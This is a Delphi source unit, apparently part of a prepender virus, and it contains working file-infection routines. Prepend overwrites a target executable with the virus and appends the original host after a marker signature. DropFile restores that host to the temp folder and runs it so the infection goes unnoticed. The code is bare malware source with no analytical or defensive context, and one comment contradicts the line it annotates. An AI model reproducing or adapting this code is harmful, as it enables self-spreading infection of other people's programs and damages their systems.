   UNIT uPrepender;

   INTERFACE

   PROCEDURE DropFile;
   PROCEDURE CutFile(F:STRING);
   PROCEDURE Prepend(Virus,DestinationFile:STRING);

   IMPLEMENTATION

   USES
     ACLUtils, Windows;

   VAR
     VirusSignature : STRING;

   //------------------------------------------------------------------------------
   FUNCTION TempPath : STRING;
   VAR
     I : WORD;
     S : ARRAY [1..MAX_PATH] OF Char;
   BEGIN
     FillChar(S,MAX_PATH,0);
     I:=GetTempPath(MAX_PATH,@S);
     IF I>0 THEN FOR I:=1 TO I DO Result:=Result+S[I];
   END;

   //------------------------------------------------------------------------------
   PROCEDURE CutFile(F:STRING);
   VAR
     G : FILE;
     A : Longint;
     P : AnsiString;
   BEGIN
     FileMode:=2;
     AssignFile(G,F);
     {$I-}
     Reset(G,1);
     IF IOResult=0 THEN BEGIN
       A:=FileSize(G);
       SetLength(P,A);
       BlockRead(G,P[1],A);
       A:=Pos(VirusSignature,P);
       IF A>0 THEN BEGIN
         Seek(G,A-1);
         Truncate(G);
       END;
       CloseFile(G);
     END;
     {$I+}
   END;

   //------------------------------------------------------------------------------
   PROCEDURE Prepend(Virus,DestinationFile:STRING);
   VAR
     A,B      : FILE;
     TempFile : STRING;
     I        : Longint;
     Buf      : AnsiString;
   BEGIN
     {$I-}
     AssignFile(A,DestinationFile);
     FileMode:=0;
     Reset(A,1);
     SetLength(Buf,FileSize(A));
     BlockRead(A,Buf[1],FileSize(A));
     CloseFile(A);
     IF Pos(VirusSignature,Buf)=0 THEN BEGIN
       TempFile:=TempPath+'~rgeffere.tmp';
       CopyFile(pChar(DestinationFile),pChar(TempFile),False);
       CopyFile(pChar(Virus),pChar(DestinatioNFile),False);
       CutFile(DestinationFile);
       FileMode:=2;
       AssignFile(A,DestinationFile);
       AssignFile(B,TempFile);
       Reset(A,1);
       IF IOResult=0 THEN BEGIN
         Reset(B,1);
         IF IOResult=0 THEN BEGIN
           Seek(A,FileSize(A));
           BlockWrite(A,VirusSignature[1],Length(VirusSignature));
           I:=FileSize(B);
           SetLength(Buf,I);
           BlockRead(B,Buf[1],I);
           BlockWrite(A,Buf[1],I);
           CloseFile(B);
         END;
         CloseFile(A);
       END;
     END;
     {$I+}
     DeleteFile(pChar(TempFile));
   END;

   //------------------------------------------------------------------------------
   PROCEDURE DropFile;
   VAR
     G   : FILE;
     S   : STRING;
     T   : Longint;
     Buf : AnsiString;
   BEGIN
     FileMode:=0;
     AssignFile(G,ParamStr(0));
     {$I-}
     Reset(G,1);
     IF IOResult=0 THEN BEGIN
       SetLength(Buf,FileSize(G));
       BlockRead(G,Buf[1],FileSize(G));
       T:=Pos(VirusSignature,Buf);
       CloseFile(G);
       IF T>0 THEN BEGIN
         T:=T+Length(VirusSignature)-1;
         S:=TempPath+ExtractFileName(ParamStr(0));
         CopyFile(pChar(ParamStr(0)),pChar(S),False);
         FileMode:=2;
         AssignFile(G,S);
         Reset(G,1);
         IF IOResult=0 THEN BEGIN
           Seek(G,T);
           T:=FileSize(G)-T;
           SetLength(Buf,T);
           BlockRead(G,Buf[1],T);
           Seek(G,0);
           BlockWrite(G,Buf[1],T);
           Truncate(G);
           CloseFile(G);
           WinExec(pChar(S),SW_SHOW);
         END;
       END;
     END;
     {$I+}
   END;

   //------------------------------------------------------------------------------
   INITIALIZATION
   BEGIN
     VirusSignature:=LowerCase('8KG\*DF');                                         //Must be uppercase string!
   END;


   END.
